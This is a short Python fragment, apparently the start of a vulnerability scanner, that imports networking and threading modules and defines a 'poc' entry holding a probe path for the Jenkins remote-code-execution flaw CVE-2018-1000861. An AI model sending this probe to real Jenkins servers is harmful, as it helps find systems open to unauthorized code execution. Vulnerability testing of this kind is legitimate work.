import os 
import codecs
import requests
import threading


poc = {"Jenkins RCE CVE-2018-1000861": "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%207bleM4k3r"}
